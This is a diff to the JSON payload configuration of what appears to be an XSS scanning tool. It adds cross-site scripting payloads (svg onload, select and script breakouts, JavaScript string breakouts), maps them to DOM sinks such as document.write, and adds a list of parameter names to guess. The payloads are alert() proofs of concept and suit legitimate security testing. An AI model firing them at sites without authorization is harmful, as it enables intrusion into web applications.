@@ -165,7 +165,10 @@
         "javascript:alert({c})",
         "<iframe src=\"javascript:alert({c})\">",
         "<details open ontoggle=alert({c})>",
-        "\\\"-alert({c})}//"
+        "\\\"-alert({c})}//",
+        "\"><svg onload=alert({c})>",
+        "\"></select><img src=1 onerror=alert({c})>",
+        "</script><script>alert({c})</script>"
     ],
     "SINK_EXPLOIT_MAP": {
         "href": [
@@ -194,6 +197,10 @@
         ],
         "document.write": [
             [
+                "\"><svg onload=alert(1)>",
+                "write-svg-breakout"
+            ],
+            [
                 "\"></select><img src=1 onerror=alert(1)>",
                 "write-select-breakout"
             ],
@@ -202,16 +209,20 @@
                 "write-script-breakout"
             ],
             [
-                "<img src=x onerror=alert(1)>",
-                "write-img"
-            ],
-            [
-                "\"><svg onload=alert(1)>",
-                "write-svg-breakout"
+                "\"><img src=x onerror=alert(1)>",
+                "write-img-breakout"
             ],
             [
                 "</option></select><img src=x onerror=alert(1)>",
                 "write-option-breakout"
+            ],
+            [
+                "';alert(1)//",
+                "write-js-single-breakout"
+            ],
+            [
+                "\";alert(1)//",
+                "write-js-double-breakout"
             ]
         ],
         "innerHTML": [
@@ -419,5 +430,6 @@
         "alert(",
         "confirm(",
         "prompt("
-    ]
+    ],
+    "GUESS_PARAMS": ["q", "search", "query", "input", "name", "redirect", "url", "next", "returnUrl", "returnPath", "return_url", "redirect_uri", "callback", "continue", "dest", "storeId", "store", "default", "page"]
 }
